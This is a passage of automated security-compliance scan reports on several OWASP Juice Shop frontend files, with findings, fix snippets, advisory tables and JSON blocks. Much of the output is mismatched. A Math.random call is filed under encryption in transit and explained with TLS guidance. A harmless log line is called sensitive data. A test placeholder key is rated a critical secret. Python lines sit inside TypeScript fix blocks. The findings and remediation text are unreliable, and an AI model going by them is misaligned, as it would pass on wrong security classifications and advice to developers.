> 💡 **Why**: Risk: Unencrypted or weakly encrypted data in transit is vulnerable to interception, man-in-the-middle attacks, and eavesdropping on networks.
> 🔧 **Guidance**: Configure TLS 1.3 as minimum. Disable TLS 1.0, 1.1, 1.2. Use modern cipher suites. Disable weak ciphers (RC4, DES, MD5).
> [Full remediation →](https://verify.example-org.internal/?id=CRYPT-M-002)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🟠 High | [IDOR-M-003](https://verify.example-org.internal/?id=IDOR-M-003) | Avoid Exposing IDs in URLs |
| 🟠 High | [LOG-M-002](https://verify.example-org.internal/?id=LOG-M-002) | Implement Comprehensive CI/CD Audit Logging |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "CRYPT-M-002", "severity": "MEDIUM", "line": 71, "message": "Non-cryptographic random number generator detected", "fix_snippet": "// Suggested fix: use a cryptographically secure RNG\n// WRONG:  const token = Math.random().toString(36);\nconst token = crypto.randomUUID();                          // browser / Node 19+\n// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes\n# Python:  import secrets; token = secrets.token_urlsafe(32)"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/frontend/src/app/nft-unlock/nft-unlock.component.spec.ts`
**Scanned at**: 2026-10-11T16:34:43.685716+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🔴 CRITICAL | [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) | No Hardcoded Secrets | 74 |

#### [SECR-M-001](https://verify.example-org.internal/?id=SECR-M-001) — Hardcoded credential in named variable detected
```ts
// Line 74
component.privateKey = 'test-private-key'
// Line 83
component.privateKey = 'test-private-key'
// Line 90
component.privateKey = 'test-private-key'
```
**Suggested fix:**
```ts
# Suggested fix: load all credentials from environment variables or a vault
import os
JWT_SECRET = os.environ['JWT_SECRET']          # Python
// const jwtSecret = process.env.JWT_SECRET;   // Node.js
# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production
```
> 💡 **Why**: Risk: Hardcoding secrets is one of the most common ways attackers gain unauthorized access to cloud resources. This control eliminates credential exposure in the repository.
> 🔧 **Guidance**: A developer must remove the secret from code, invalidate the token, and store it in an approved secret vault (e.g., Azure Key Vault or HashiCorp Vault).
> [Full remediation →](https://verify.example-org.internal/?id=SECR-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [CRYPT-M-006](https://verify.example-org.internal/?id=CRYPT-M-006) | Hardware Security Module (HSM) for High-Value Keys |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🟠 High | [HDR-M-006](https://verify.example-org.internal/?id=HDR-M-006) | Enforce Content-Type and Charset |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🔴 Critical | [HDR-M-014](https://verify.example-org.internal/?id=HDR-M-014) | Content Security Policy CSP |
| 🔴 Critical | [INJECT-M-002](https://verify.example-org.internal/?id=INJECT-M-002) | OS Command Injection Prevention |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "SECR-M-001", "severity": "CRITICAL", "line": 74, "message": "Hardcoded credential in named variable detected", "fix_snippet": "# Suggested fix: load all credentials from environment variables or a vault\nimport os\nJWT_SECRET = os.environ['JWT_SECRET']          # Python\n// const jwtSecret = process.env.JWT_SECRET;   // Node.js\n# Use Azure Key Vault / AWS Secrets Manager / HashiCorp Vault in production"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/frontend/src/app/faucet/faucet.component.ts`
**Scanned at**: 2026-10-11T16:34:47.510973+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟠 HIGH | [LOG-M-001](https://verify.example-org.internal/?id=LOG-M-001) | Stream Logs to SIEM | 239 |

#### [LOG-M-001](https://verify.example-org.internal/?id=LOG-M-001) — Sensitive data logged to console
```ts
// Line 239
console.log('BEE tokens extracted successfully')
```
**Suggested fix:**
```ts
// Suggested fix: never log credentials — log a masked reference instead
// WRONG:  console.log('Auth', password, apiKey);
const logger = require('./logger');  // structured logger (e.g. winston, pino)
logger.info('Auth attempt', { userId, tokenPresent: !!apiKey });  // mask value
```
> 💡 **Why**: Risk: Without centralized logging, it is impossible to perform effective incident response. If an attacker breaches an application, the logs on the compromised server will be the first thing they delete.
> 🔧 **Guidance**: Mask or redact secrets in CI output, avoid echoing environment variables, and configure log retention/access controls. Invalidate any secret discovered in logs.
> [Full remediation →](https://verify.example-org.internal/?id=LOG-M-001)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [AUTH-M-003](https://verify.example-org.internal/?id=AUTH-M-003) | Session Management & Timeout Controls |
| 🔴 Critical | [IDOR-M-004](https://verify.example-org.internal/?id=IDOR-M-004) | Context-Aware Data Queries |
| 🟠 High | [IDOR-M-002](https://verify.example-org.internal/?id=IDOR-M-002) | Opaque Object Identifiers |
| 🟠 High | [IDOR-M-003](https://verify.example-org.internal/?id=IDOR-M-003) | Avoid Exposing IDs in URLs |
| 🟠 High | [IDOR-M-005](https://verify.example-org.internal/?id=IDOR-M-005) | IDOR Test Coverage Matrix |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🟠 High | [AUTH-M-004](https://verify.example-org.internal/?id=AUTH-M-004) | Password Reset & Account Recovery |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "LOG-M-001", "severity": "HIGH", "line": 239, "message": "Sensitive data logged to console", "fix_snippet": "// Suggested fix: never log credentials \u2014 log a masked reference instead\n// WRONG:  console.log('Auth', password, apiKey);\nconst logger = require('./logger');  // structured logger (e.g. winston, pino)\nlogger.info('Auth attempt', { userId, tokenPresent: !!apiKey });  // mask value"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "AUTH-M-003", "title": "Session Management & Timeout Controls", "risk_level": "High"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "AUTH-M-004", "title": "Password Reset & Account Recovery", "risk_level": "High"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "HDR-M-009", "title": "Cache-Control for Sensitive Data", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "SAST-M-003", "title": "Disable XXE Processing", "risk_level": "Critical"}, {"id": "SAST-M-006", "title": "Native Memory Safety and Unsafe Code Assurance", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "AJAX-M-001", "title": "AJAX Request Validation & CSRF Protection", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "COOK-M-001", "title": "Secure Cookie Attributes (HttpOnly, Secure, SameSite)", "risk_level": "Critical"}, {"id": "HDR-M-002", "title": "No Server Banners", "risk_level": "Critical"}, {"id": "HDR-M-003", "title": "Enforce HSTS", "risk_level": "Critical"}, {"id": "HDR-M-007", "title": "Enforce Referrer Policy", "risk_level": "Critical"}, {"id": "HDR-M-008", "title": "Enforce Permissions Policy", "risk_level": "Critical"}, {"id": "HDR-M-011", "title": "Cross-Origin-Resource-Policy (CORP)", "risk_level": "Critical"}, {"id": "HDR-M-012", "title": "Cross-Origin-Embedder-Policy (COEP)", "risk_level": "Critical"}, {"id": "HDR-M-014", "title": "Content Security Policy CSP", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "COOK-M-002", "title": "Cookie Theft Prevention & Rotation", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "CRYPT-M-001", "title": "Encryption at Rest", "risk_level": "Critical"}, {"id": "CRYPT-M-002", "title": "Encryption in Transit (TLS 1.3+)", "risk_level": "Critical"}, {"id": "SAST-M-001", "title": "No Critical SAST Findings", "risk_level": "Critical"}, {"id": "SAST-M-002", "title": "Secure File Upload Validation", "risk_level": "Critical"}, {"id": "SAST-M-004", "title": "Prevent Insecure Deserialization", "risk_level": "Critical"}, {"id": "SAST-M-005", "title": "Prevent Mass Assignment", "risk_level": "Critical"}, {"id": "CORS-M-001", "title": "No Reflected Origin (CORS)", "risk_level": "High"}, {"id": "CRYPT-M-003", "title": "Key Rotation & Lifecycle Management", "risk_level": "High"}, {"id": "CRYPT-M-004", "title": "Algorithm Selection & Post-Quantum Readiness", "risk_level": "High"}, {"id": "CRYPT-M-005", "title": "Certificate Management & Pinning", "risk_level": "High"}]
-->

---

## SAGF Compliance Scan: `juice-shop-master/frontend/src/app/chatbot/chat-welcome-screen/chat-welcome-screen.component.ts`
**Scanned at**: 2026-10-11T16:34:47.771999+00:00
**Mandard DB coverage**: 64 applicable mandards checked (SECR, SAST, HDR, CORS, INPUT, INJECT…)
**Attestation**: `eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ0aW1lc3RhbXAiOiA...`

### 🚨 Confirmed Violations (1)
| Sev | Mandard | Title | Line |
|-----|---------|-------|------|
| 🟡 MEDIUM | [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) | Encryption in Transit (TLS 1.3+) | 71 |

#### [CRYPT-M-002](https://verify.example-org.internal/?id=CRYPT-M-002) — Non-cryptographic random number generator detected
```ts
// Line 71
const chosen = availableSuggestions[Math.floor(Math.random() * availableSuggestions.length)]
```
**Suggested fix:**
```ts
// Suggested fix: use a cryptographically secure RNG
// WRONG:  const token = Math.random().toString(36);
const token = crypto.randomUUID();                          // browser / Node 19+
// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes
# Python:  import secrets; token = secrets.token_urlsafe(32)
```
> 💡 **Why**: Risk: Unencrypted or weakly encrypted data in transit is vulnerable to interception, man-in-the-middle attacks, and eavesdropping on networks.
> 🔧 **Guidance**: Configure TLS 1.3 as minimum. Disable TLS 1.0, 1.1, 1.2. Use modern cipher suites. Disable weak ciphers (RC4, DES, MD5).
> [Full remediation →](https://verify.example-org.internal/?id=CRYPT-M-002)

### ⚠️ Most Relevant Mandards Requiring Tool Verification
_Ranked by relevance to this code. Static scan did not detect violations — use the SAGF Tier 2 toolchain to verify:_

| Risk | Mandard | Title |
|------|---------|-------|
| 🟠 High | [INPUT-M-002](https://verify.example-org.internal/?id=INPUT-M-002) | Input Encoding & Output Encoding |
| 🟠 High | [IDOR-M-003](https://verify.example-org.internal/?id=IDOR-M-003) | Avoid Exposing IDs in URLs |
| 🟠 High | [LOG-M-002](https://verify.example-org.internal/?id=LOG-M-002) | Implement Comprehensive CI/CD Audit Logging |
| 🟠 High | [DEP-M-003](https://verify.example-org.internal/?id=DEP-M-003) | Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion) |
| 🟠 High | [INPUT-M-001](https://verify.example-org.internal/?id=INPUT-M-001) | Whitelist-Based Input Validation |
| 🔴 Critical | [HDR-M-001](https://verify.example-org.internal/?id=HDR-M-001) | Enforce X-Content-Type-Options |
| 🔴 Critical | [HDR-M-005](https://verify.example-org.internal/?id=HDR-M-005) | Disable Legacy X-XSS-Protection Filter |
| 🔴 Critical | [IDOR-M-001](https://verify.example-org.internal/?id=IDOR-M-001) | IDOR Protection |

_+ 55 more applicable mandards — [view all 63 in SAGF UI →](https://verify.example-org.internal/)_

> Run SonarQube, Snyk, Semgrep, and other SAGF Tier 2 tools for comprehensive coverage per SAGF-STD-004.

<!-- CODI_FINDINGS_JSON
[{"mandard_id": "CRYPT-M-002", "severity": "MEDIUM", "line": 71, "message": "Non-cryptographic random number generator detected", "fix_snippet": "// Suggested fix: use a cryptographically secure RNG\n// WRONG:  const token = Math.random().toString(36);\nconst token = crypto.randomUUID();                          // browser / Node 19+\n// or:  const buf = crypto.getRandomValues(new Uint8Array(32));  // raw bytes\n# Python:  import secrets; token = secrets.token_urlsafe(32)"}]
-->

<!-- CODI_ADVISORY_JSON
[{"id": "INPUT-M-002", "title": "Input Encoding & Output Encoding", "risk_level": "High"}, {"id": "IDOR-M-003", "title": "Avoid Exposing IDs in URLs", "risk_level": "High"}, {"id": "LOG-M-002", "title": "Implement Comprehensive CI/CD Audit Logging", "risk_level": "High"}, {"id": "DEP-M-003", "title": "Dependency Name-Confusion Defense (Typosquatting, Slopsquatting, Dependency Confusion)", "risk_level": "High"}, {"id": "INPUT-M-001", "title": "Whitelist-Based Input Validation", "risk_level": "High"}, {"id": "HDR-M-001", "title": "Enforce X-Content-Type-Options", "risk_level": "Critical"}, {"id": "HDR-M-005", "title": "Disable Legacy X-XSS-Protection Filter", "risk_level": "Critical"}, {"id": "IDOR-M-001", "title": "IDOR Protection", "risk_level": "Critical"}, {"id": "IDOR-M-004", "title": "Context-Aware Data Queries", "risk_level": "Critical"}, {"id": "CRYPT-M-006", "title": "Hardware Security Module (HSM) for High-Value Keys", "risk_level": "High"}, {"id": "HDR-M-006", "title": "Enforce Content-Type and Charset", "risk_level": "High"}, {"id": "IDOR-M-002", "title": "Opaque Object Identifiers", "risk_level": "High"}, {"id": "IDOR-M-005", "title": "IDOR Test Coverage Matrix", "risk_level": "High"}, {"id": "IDOR-M-006", "title": "Log Authorization Failures", "risk_level": "High"}, {"id": "IDOR-M-007", "title": "Validate Nested Resource Ownership", "risk_level": "High"}, {"id": "LOG-M-001", "title": "Stream Logs to SIEM", "risk_level": "High"}, {"id": "LOG-M-003", "title": "Configure Centralized Log Aggregation and SIEM Alerting for CI/CD", "risk_level": "High"}, {"id": "LOG-M-004", "title": "Trusted Time Synchronization for Security Events", "risk_level": "High"}, {"id": "DEP-M-001", "title": "Pin Dependency Versions in Production Builds", "risk_level": "Critical"}, {"id": "INJECT-M-002", "title": "OS Command Injection Prevention", "risk_level": "Critical"}, {"id": "INJECT-M-003", "title": "XML External Entity (XXE) Prevention", "risk_level": "Critical"}, {"id": "SECR-M-001", "title": "No Hardcoded Secrets", "risk_level": "Critical"}, {"id": "SECR-M-002", "title": "Prevent Secret Exposure in CI/CD Logs and History", "risk_level": "Critical"}, {"id": "SECR-M-004", "title": "Short-Lived Credentials & Rotation", "risk_level": "Critical"}, {"id": "SECR-M-005", "title": "No Secrets in Build Logs", "risk_level": "Critical"}, {"id": "DEP-M-002", "title": "Package Manager Lifecycle Script Hardening", "risk_level": "High"}, {"id": "INJECT-M-001", "title": "LDAP Injection Prevention", "risk_level": "High"}, {"id": "SECR-M-003", "title": "Enforce Temporary Credentials and Credential Rotation in CI/CD", "risk_level": "High"}, {"id": "AJAX-M-002", "title": "AJAX Response Sanitization & XSS Prevention", "risk_level": "Critical"}, {"id": "AUTH-M-001", "title": "Secure Password Hashing", "risk_level": "Critical"}, {"id": "AUTH-M-002", "title": "Multi-Factor Authentication (MFA) Enforcement", "risk_level": "Critical"}, 